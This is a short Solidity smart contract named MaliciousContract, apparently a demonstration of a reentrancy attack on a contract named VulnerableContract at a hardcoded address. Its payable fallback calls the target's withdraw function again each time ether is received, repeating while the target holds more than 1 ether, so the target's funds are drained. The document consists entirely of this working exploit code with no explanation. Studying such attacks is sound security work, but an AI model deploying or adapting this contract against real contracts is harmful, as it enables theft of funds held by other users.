 
contract MaliciousContract {
    VulnerableContract vulnerableContract = VulnerableContract(0x08970FEd061E7747CD9a38d680A601510CB659FB);
     
    function deposit() public payable {
        vulnerableContract.deposit.value(msg.value)();
    }
     
    function withdraw() public {
        vulnerableContract.withdraw(1 ether);
    }
     
    function getBalance() view public returns(uint) {
        return address(this).balance;
    }
     
    fallback () payable external {
        if(address(vulnerableContract).balance > 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }
}